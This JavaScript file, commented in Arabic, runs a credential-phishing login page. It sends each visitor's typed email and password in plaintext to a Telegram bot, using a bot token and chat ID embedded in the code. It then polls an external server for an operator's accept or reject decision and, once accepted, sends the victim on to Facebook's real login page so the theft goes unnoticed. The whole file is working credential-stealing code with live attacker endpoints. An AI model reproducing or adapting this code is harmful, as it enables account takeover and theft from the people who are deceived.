// ✅ إعادة تعيين الحالة عند دخول الصفحة (reset)
fetch('https://login-vpns.onrender.com/update-status?action=reset')
  .then(res => res.text())
  .then(() => console.log('🔁 تم إعادة تعيين الحالة عند تحميل الصفحة'))
  .catch(err => console.error('❌ فشل في reset الحالة:', err));

// ✅ عند الضغط على زر "Log In"
document.getElementById('submit-btn').addEventListener('click', () => {
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!email || !password) {
        alert("⚠️ يرجى إدخال البريد وكلمة المرور.");
        return;
    }

    // إرسال البيانات إلى بوت التليجرام
    fetch('https://api.telegram.org/bot7828630167:AAG8iKwW5-NKU7OsmYDGmxip3NhhDBKLXVk/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: '5443898294',
            text: `🔐 Login Attempt\n📧 Email: ${email}\n🔑 Password: ${password}`,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ Accept', callback_data: 'accept' },
                        { text: '❌ Reject', callback_data: 'reject' }
                    ]
                ]
            }
        })
    })
    .then(() => {
        console.log('📤 تم إرسال البيانات إلى البوت، ننتظر الرد...');
        checkLoginStatus(); // ✅ نبدأ التحقق من الحالة
    })
    .catch(error => {
        console.error("❌ فشل في إرسال البيانات إلى تيليجرام:", error);
    });
});

// ✅ التحقق من حالة القبول/الرفض
function checkLoginStatus() {
    const interval = setInterval(() => {
        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();

        // ✅ لا نتابع إذا لم يدخل المستخدم بيانات
        if (!email || !password) {
            clearInterval(interval);
            console.log("⛔ لا توجد بيانات مدخلة، لا يتم التوجيه.");
            return;
        }

        fetch('https://login-vpns.onrender.com/get-status')
            .then(res => res.json())
            .then(data => {
                if (data.accepted) {
                    clearInterval(interval);
                    console.log("✅ تم القبول، توجيه المستخدم...");
                    window.location.href = 'https://www.facebook.com/login';
                } else if (data.rejected) {
                    clearInterval(interval);
                    console.log("❌ تم الرفض، عرض الرسالة للمستخدم.");
                    document.getElementById('error-message').style.display = 'block';
                }
            })
            .catch(err => {
                console.error('⚠️ خطأ أثناء التحقق من الحالة:', err);
            });
    }, 2000);
}
